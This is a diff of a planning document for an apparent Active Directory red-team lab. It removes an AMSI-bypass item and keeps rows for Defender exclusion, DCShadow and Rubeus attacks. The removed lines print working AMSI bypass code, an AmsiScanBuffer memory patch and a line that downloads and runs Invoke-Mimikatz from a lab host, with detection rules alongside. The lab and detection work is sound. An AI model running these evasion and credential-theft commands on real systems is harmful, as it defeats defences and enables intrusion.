@@ -1159,7 +1159,6 @@ psexec.py -k -no-pass child.cadre.local/Administrator@dc02.child.cadre.local
 | Cross-cutting (validation) | 106 | Atomic Red Team as validation framework | 🆕 Add — cross-validate manual attacks |
 | Plan 0.8 + Track H | 107 | GitHub Actions Supply-Chain Attack Patterns (cache poisoning + tag pollution analog + AI agent guardrails) — Flatt Security 2026-06-24 | ⏳ Pending — Plan 0.8 expansion F-11/F-12 + CADRE-Strike defensive |
 | Phase 3 + plan1.7 | 108 | Defender Exclusion via PowerShell (T1562.001) — KQL patterns + AI-vs-human finding — Detect FYI 2026-06-24 | ⏳ Pending — Phase 3 attack primitive + plan1.7 §17 detection + Track C Sigma |
-| Phase 3 + plan1.7 | 109 | AMSI Bypass Techniques (bl4ckarch — One Bool. Six Shells. AMSI's Design Problem, 2026-06-25) | ⏳ Add — 6 confirmed reverse-shell-verified techniques (was Gray Hat Hacking, superseded) |
 | Phase 7 + plan1.7 | 110 | DCShadow Attack (DRS replication) — Applied Incident Response + Practical-Red-Teaming | ⏳ Add — alternative persistence after DCSync |
 | Phase 1/2/7 | 111 | Rubeus/Kerberoast/AS-REP playbook cross-validation | ⏳ Add — cross-validate existing Phase 1/2/7 commands |
 | Study Ref (Track H) | 112 | Practical AI Security (2025) — CADRE-Strike LLM Security | ⏳ Pending — study reference for CADRE-Strike |
@@ -1263,7 +1262,6 @@ psexec.py -k -no-pass child.cadre.local/Administrator@dc02.child.cadre.local
 | 106 | Atomic Red Team validation 🆕 | `Invoke-AtomicTest T1003.001,T1558.003,T1003.006 -ShowDetails` | Cross-validate manual CAMPAIGNS.md attacks — 1000+ pre-built MITRE ATT&CK tests | Same as the underlying attack (T1003.001 → Sysmon 10, etc.) |
 | 107 | GitHub Actions Supply-Chain patterns ⏳ | `npm publish --tag` + `npm dist-tag add` (analog) / `claude-code-action` defensive config (Track H) | Plan 0.8 F-11/F-12 cache poisoning + tag pollution + CADRE-Strike guardrails | Sysmon EID 1 `npm publish` from non-standard path + Zeek HTTP POST to npm registry |
 | 108 | Defender Exclusion via PowerShell ⏳ | `Add-MpPreference -ExclusionPath "C:\Users\target\AppData\Local\Temp" -ExclusionProcess "mimikatz.exe"` (T1562.001) | Runtime exclusion before mimikatz/AMSI bypass; persistence via Group Policy | WinSec 5001 (Defender config change) + WinSec 4688 (PowerShell cmdlet) + Elastic KQL `process.command_line : "*MpPreference*ExclusionPath*"` |
-| 109 | AMSI Bypass (bl4ckarch) ⏳ | `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('s_amsiInit'+'Failed','NonPublic,Static').SetValue($null,$true)` + pAppName null `[Marshal]::WriteInt64($ctx, 0x08, 0L)` for PS 7 | Disable AMSI before PowerShell payload with Defender real-time ON. 6 techniques confirmed by reverse shell. Bypasses BOTH PS 7 paths (ScanContent + ReportContent) | WinSec 4104 (ScriptBlock logging — **not** suppressed by any bypass) + Sysmon EID 1 `DynamicMethod + Marshal.WriteInt64 + AmsiUtils` + memory forensics (read `s_amsiInitFailed`/`s_amsiNotifyFailed` post-bypass) + 5 Sigma rules in plan1.7 §16 |
 | 110 | DCShadow ⏳ | `mimikatz.exe` → `lsadump::dcshadow /object:CN=krbtgt,... /attribute:servicePrincipalName /value:"FAKE/spn"` | Inverse of DCSync — push fake SID history/SPN to DC via DRS replication | WinSec 4662 from non-DC source + WinSec 5136 + Zeek DCE-RPC `drsuapi` from non-DC |
 | 111 | Rubeus/Kerberoast/AS-REP cross-validation ⏳ | `Rubeus.exe asreproast /user:intern_blue /dc:192.168.77.11 /nowrap` + `kerberoast /aes` + `golden /aes256` | Verify existing Phase 1/2/7 commands against book recommendations; check for missing flags (`/rc4opsec`, `/authexp`, `/tgtdeleg`) | SID:1000015 (existing) + ET:2000002 (existing) |
 | 68 | Azure AD Connect DPAPI Dump ⏳ | `adconnectdump` on dc01 (Cloud Sync) | MSOL credentials → Entra ID bridge | Sysmon EID 1 |
@@ -1896,7 +1894,6 @@ psexec.py -k -no-pass child.cadre.local/Administrator@dc02.child.cadre.local
 | 106 | Atomic Red Team as validation framework | Cross-cutting (validation) | 2026 | 🆕 |
 | 107 | GitHub Actions Supply-Chain Attack Patterns | Plan 0.8 + Track H | 2026 | ⏳ |
 | 108 | Defender Exclusion via PowerShell (T1562.001) | Phase 3 + plan1.7 + Track C + Track H | 2026 | ⏳ |
-| 109 | AMSI Bypass Techniques (bl4ckarch, supersedes Gray Hat) | Phase 3 + plan1.7 + Track C | 2026 | ⏳ |
 | 110 | DCShadow Attack (DRS replication) | Phase 7 + plan1.7 | 2026 | ⏳ |
 | 111 | Rubeus/Kerberoast/AS-REP cross-validation | Phase 1/2/7 | 2026 | ⏳ |
 | 112 | Practical AI Security (2025) | Track H (CADRE-Strike) | 2025 | ⏳ |
@@ -1939,7 +1936,8 @@ This is the running index of all items by source. Updated as items are added.
 | **102-106** | **5 concrete techniques extracted from reference books** | **Same sources as #100-101** |
 | **107** | **GitHub Actions Supply-Chain Attack Patterns (cache poisoning + tag pollution analog + AI agent guardrails)** | **GMO Flatt Security blog Part 1 (Sato, 2026-06-24)** |
 | **108** | **Defender Exclusion via PowerShell (T1562.001) — KQL patterns + AI-vs-human finding** | **Detect FYI by Alex Teixeira (2026-06-24)** |
-| **109-111** | **3 concrete techniques extracted from ebooks/ — AMSI bypass (Gray Hat Hacking 6th Ed → SUPERSEDED by bl4ckarch 2026-06-25), DCShadow (Applied Incident Response + Practical-Red-Teaming), Rubeus cross-validation** | **Same ebooks survey sources + bl4ckarch blog** |
+| **109** | **Item REMOVED (session 16) — AMSI bypass not relevant to lab (Defender disabled); tracked in `ad-evasion-gap-analysis.md` as AD-specific evasion (sister project integration)** | — |
+| **110-111** | **2 concrete techniques extracted from ebooks/ — DCShadow (Applied Incident Response + Practical-Red-Teaming), Rubeus cross-validation** | **Same ebooks survey sources** |
 | **112-115** | **4 study reference books (Tier 2) — Practical AI Security, Cyber Threat Hunting, Practical Threat Detection Engineering, Windows Internals Part 1** | **ebooks/ survey 2026-06-25** |
 
 **Numbering notes:**
@@ -3635,52 +3633,6 @@ Remove-MpPreference -ExclusionProcess "mimikatz.exe"
 
 #### Tier 1 — HIGH value (7 books)
 
-**109. AMSI Bypass Techniques (bl4ckarch — One Bool. Six Shells. AMSI's Design Problem) ⏳**
-- **Source:** [bl4ckarch blog 2026-06-25](https://bl4ckarch.github.io/posts/One-Bool.-Six-Shells.-AMSI%27s-Design-Problem/) — 6 confirmed reverse-shell-verified techniques. **Supersedes** Gray Hat Hacking 6th Ed (session 13) — those 3 techniques are confirmed broken on PS 7 + Defender kernel callback.
-- **Campaign location:** Phase 3 (Execution) + Phase 5 (Persistence). AMSI bypass enables PowerShell payload execution with Defender real-time ON.
-- **Phase mapping:**
-  | Phase | Application |
-  |---|---|
-  | Phase 3 (Execution) | AMSI bypass before mimikatz/Rubeus payload (Bypass 5 or 6 for PS 7) |
-  | Phase 5 (Persistence) | Persisted AMSI bypass via WMI Event Subscription / Scheduled Task |
-  | plan1.7 §16 detection | 5 Sigma rules + WinSec 4104 + memory forensics |
-- **CADRE applicability:** Real-world attackers ALWAYS bypass AMSI before running mimikatz/Rubeus/etc. We currently disable Defender (`04-vulnerabilities.yml`) but realistic test = AMSI bypass + payload.
-- **Test plan:**
-  ```powershell
-  # Sample AMSI bypass (multiple known techniques):
-  # 1. amsiInitFailed technique
-  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-
-  # 2. AmsiScanBuffer patch
-  $Win32 = @"
-  using System;
-  using System.Runtime.InteropServices;
-  public class Win32 {
-      [DllImport("kernel32")]
-      public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-      [DllImport("kernel32")]
-      public static extern IntPtr LoadLibrary(string name);
-      [DllImport("kernel32")]
-      public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-  }
-  "@
-  Add-Type $Win32
-  $LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
-  $Address = [Win32]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")
-  $Patch = [Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3)
-  $Protect = 0
-  [Win32]::VirtualProtect($Address, [UIntPtr]::SizeOf($Patch), 0x40, [ref]$Protect)
-  [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
-  # Now run mimikatz — AMSI won't scan
-  iex (New-Object Net.WebClient).DownloadString('http://192.168.77.60:8080/Invoke-Mimikatz.ps1')
-  ```
-- **Detection (plan1.7 §17 held):**
-  - WinSec 4104 (PowerShell ScriptBlock logging) — capture bypass code
-  - Sysmon EID 1 — `powershell.exe` + `[Ref].Assembly` OR `amsi.dll` in command line
-  - Elastic KQL: `process.command_line:*amsi* or process.command_line:*AmsiScanBuffer*`
-  - Sigma: `win_amsi_bypass.yml` candidate
-- **Cross-references:** Item #106 (Atomic Red Team T1566/T1059), plan1.7 §17, Track C (Sigma), Gray Hat Hacking 6th Ed chapter on bypassing AV.
-
 **110. DCShadow Attack (Applied Incident Response + Practical-Red-Teaming) ⏳**
 - **Sources:** Applied Incident Response (Anson, `C:\STUDY\Github\CADRE-Courses\ebooks\Applied Incident Response\`), 1002 KB (146 AD matches: DCShadow x5). Practical-Red-Teaming (Tumne 2023, `C:\STUDY\Github\CADRE-Courses\ebooks\Practical-Red-Teaming\`), 317 KB.
 - **Campaign location:** Phase 7 (Privilege Escalation). DCShadow is the **inverse of DCSync** — instead of pulling data from DC, attacker **pushes changes** (fake SID history, fake SPN, fake group membership).
@@ -3762,73 +3714,6 @@ Remove-MpPreference -ExclusionProcess "mimikatz.exe"
 9. **Brc4** (204 KB) — dense AD cheat sheet.
 10. **Windows Internals Part 2, 7th Ed** (2021, 1720 KB) — storage/I/O/registry internals.
 11. **eb-powershell-in-a-month-of-lunches** (647 KB) — PowerShell fundamentals for Phase 3.5/5+ scripting.
-
----
-
-### 109. AMSI Bypass Techniques (bl4ckarch — One Bool. Six Shells. AMSI's Design Problem) ⏳
-
-**Status:** ⏳ UPDATED (2026-06-25 session 16). **Was** based on Gray Hat Hacking 6th Ed (session 13, 3 outdated techniques). **Now** based on bl4ckarch's reverse-shell-verified research (May 2026, 6 techniques, all allow `Invoke-PowerShellTcp` through with Defender real-time ON). Supersedes prior 3 techniques.
-
-**Source:** [One Bool. Six Shells. AMSI's Design Problem](https://bl4ckarch.github.io/posts/One-Bool.-Six-Shells.-AMSI%27s-Design-Problem/) by bl4ckarch, 2026-06-25. Air-gapped Windows 11 VM, Windows Defender real-time ON throughout, Nishang `Invoke-PowerShellTcp` (8678 bytes) as end-to-end reverse-shell proof.
-
-**Campaign location:** Phase 3 (Execution) + Phase 5 (Persistence). AMSI bypass enables PowerShell payload execution with Defender real-time protection actively enabled. **Predecessor Gray Hat techniques are now known-broken on modern targets** (see "Why previous techniques failed" below).
-
-**Why the previous 3 Gray Hat techniques failed (bl4ckarch live-tested):**
-- **`amsiInitFailed` field reflection** (Bypass 1 in our old #109) — only works on **PowerShell 5.1**. On **PS 7**, the field was renamed to `s_amsiInitFailed` AND `initonly` constraint added. Reflection `SetValue()` throws `FieldAccessException`.
-- **`AmsiScanBuffer` patching** (Bypass 2 in our old #109) — Defender kernel callback **kills the session** when this address is patched. Live-tested: patching `AmsiScanBuffer` (RVA 0x8160) triggers Defender response. Works only if Defender disabled (which is exactly what `04-vulnerabilities.yml` does for our lab).
-- **Forced error** — partial bypass only. The new Bypass 5 (pAppName null write at ctx+0x08) is a strict improvement.
-
-**6 new confirmed techniques (all reverse-shell verified):**
-
-| # | Technique | Platform | VirtualProtect | Both Paths? |
-|---|---|---|---|---|
-| 1 | Direct field reflection (`amsiInitFailed = $true`) | PS 5.1 | No | Yes |
-| 2 | ETW suppression + field reflection chain | PS 5.1 | No | Yes + ETW |
-| 3 | **DynamicMethod IL emission (`stsfld`)** | **PS 7** | No | Yes |
-| 4 | **JIT heap patch + `s_amsiNotifyFailed` write** | **PS 7** | No (on amsi.dll) | Yes |
-| 5 | **`pAppName` null write at `ctx+0x08`** | **PS 7** | No | Yes |
-| 6 | **InternalNotify patch + pAppName null (minimum-API)** | **PS 7** | 1 call | Yes |
-
-**Attack primitive (most minimal — Bypass 5 pAppName null):**
-```powershell
-$bf = [Reflection.BindingFlags]'NonPublic,Static'
-$t  = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-$ctx = [IntPtr]::Zero
-foreach ($n in @('s_amsiContext','amsiContext')) {
-    $f = $t.GetField($n, $bf)
-    if ($f) { $v = $f.GetValue($null); if ($v -ne [IntPtr]::Zero) { $ctx = [IntPtr]$v; break } }
-}
-# One write. Both paths disabled. Zero VirtualProtect.
-[System.Runtime.InteropServices.Marshal]::WriteInt64($ctx, 0x08, 0L)
-```
-
-**Phase mapping:**
-| Phase | Application |
-|---|---|
-| Phase 3 (Execution) | AMSI bypass before mimikatz/Rubeus/SO-CRATES payload delivery (Bypass 5 or 6 for PS 7) |
-| Phase 5 (Persistence) | Persisted AMSI bypass via WMI Event Subscription / Scheduled Task running bypass on startup |
-| plan1.7 §16 detection | DETECT AMSI bypass via Sigma rules + WinSec 4104 + memory forensics |
-
-**CADRE applicability:** Real-world attackers ALWAYS bypass AMSI before running mimikatz/Rubeus. The previous Gray Hat techniques are confirmed broken on PS 7 (our lab VMs ship Server 2025 = PS 5.1 default, but PowerShell 7 is in `04-windows-features.yml` add-on scope). The bl4ckarch techniques are the only ones confirmed against **modern + Defender-on** environments.
-
-**Key architectural findings (from article §1):**
-- AMSI has **6 null-pointer guards** that each fail-open to `AMSI_RESULT_NOT_DETECTED` — 6 separate detection opportunities
-- **PS 7 has TWO scan paths** (Path A `ScanContent` + Path B `ReportContent`); all 6 techniques disable BOTH
-- Defender kernel callback **only watches `AmsiScanBuffer` at RVA 0x8160** — JIT heap, vtable slots, `InternalScan`/`InternalNotify` are **unmonitored**
-- The `s_amsiInitFailed` field got `initonly` on PS 7 but **`s_amsiNotifyFailed` did NOT** — Microsoft's inconsistency is the bypass vector
-- **Event ID 4104 (WinSec PowerShell ScriptBlock) is NOT suppressed by any of these bypasses** — ETW suppression (Bypass 2) silences only ETW provider, not Windows Event Log
-
-**Detection (added to plan1.7 §16 — 5 Sigma rules + memory forensics):**
-See `docs/internal/plan01-upgrades/plan1.7-defense-deepening.md` §16 AMSI Bypass Detection for full detection engineering. Summary:
-- **Sigma rule** (provided in article for Bypass 3): `DynamicMethod + GetILGenerator + Stsfld + Emit + AmsiUtils + s_amsiInitFailed`
-- **Sigma rule** for Bypass 4: `Marshal.Copy + WinScanContent + PrepareMethod + GetFunctionPointer`
-- **Sigma rule** for Bypass 5: `Marshal.WriteInt64 + amsContext + 0x08`
-- **Sigma rule** for Bypass 6: `VirtualProtect + Marshal.ReadInt64 + 0x28 + vtable`
-- **Memory forensics**: detect post-bypass state via CLR profiling API — read `s_amsiInitFailed`/`s_amsiNotifyFailed` as `true`
-- **Native patch detection**: hash `InternalScan` (RVA 0x2b10) + `InternalNotify` (RVA 0x1990) first 16 bytes, compare against disk baseline (ASLR-corrected)
-- **WinSec 4104 (ScriptBlock logging)** is the **primary detection** — bypasses do not suppress it
-
-**Cross-references:** bl4ckarch blog (primary source), Gray Hat Hacking 6th Ed (superseded), Item #106 (Atomic Red Team T1562.001 defense impairment), Item #108 (Defender exclusion — complementary runtime disable), Item #110 (DCShadow — different evasion class), plan1.7 §16 detection engineering, Track C (Sigma Rule Library), pl
 
 ---
 
